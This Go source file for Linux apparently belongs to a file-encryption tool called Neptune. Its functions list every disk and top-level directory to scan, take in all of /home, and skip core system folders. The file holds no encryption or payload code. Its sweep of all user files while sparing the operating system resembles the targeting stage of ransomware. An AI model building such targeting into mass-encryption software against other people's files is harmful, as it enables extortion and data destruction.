//go:build linux

// Package utils provides common utility functions and types for the Neptune encryption tool.
// This file contains Linux-specific disk utility functions. It is only compiled
// when building for the Linux platform (go:build linux tag).
package utils



// GetAllDisks returns a list of all available disk mount points on the system.
// On Linux, this currently returns a simplified list containing only the root
// filesystem mount point ("/").
//
// Returns:
//   - A slice of strings containing disk mount point paths.
//   - An error if the operation fails, currently always nil for this implementation.
func GetAllDisks() ([]string, error) {
	return []string{"/"}, nil
}

// GetAllDesktopDirectories returns an empty slice on Linux.
// On Linux, the /home directory is already included in the scan through
// GetTopLevelDirectories(), which scans the entire /home directory recursively.
// Therefore, there is no need for a separate Desktop directory scan.
//
// Returns:
//   - []string: An empty slice since /home is scanned entirely via GetTopLevelDirectories.
//   - error: Always nil for this implementation.
func GetAllDesktopDirectories() ([]string, error) {
	return []string{}, nil
}

// GetTopLevelDirectories returns a list of top-level directories within a
// given disk path on Linux. The root path itself is included as the first
// element to ensure files at the root level are also scanned. It delegates
// to the GetDirectories utility function to enumerate directories at the
// specified path, excluding core system directories.
//
// Parameters:
//   - diskPath: The path to the disk or mount point to scan for top-level directories.
//
// Returns:
//   - A slice of strings containing the root path and its top-level subdirectories (excluding system dirs).
//   - An error if directory enumeration fails.
func GetTopLevelDirectories(diskPath string) ([]string, error) {
	dirs, err := GetDirectories(diskPath)
	if err != nil {
		return nil, err
	}

	// Exclude core system directories that should not be scanned
	systemDirs := map[string]bool{
		"/bin":    true,
		"/boot":   true,
		"/dev":    true,
		"/lib":    true,
		"/lib64":  true,
		"/proc":   true,
		"/sbin":   true,
		"/sys":    true,
		"/media":  true,
		"/mnt":    true,
	}

	// Include the root path itself to scan files at the root level
	// This ensures files like /test.pdf are also scanned, not just subdirectories
	filteredDirs := []string{diskPath}
	for _, dir := range dirs {
		if !systemDirs[dir] {
			filteredDirs = append(filteredDirs, dir)
		}
	}

	return filteredDirs, nil
}
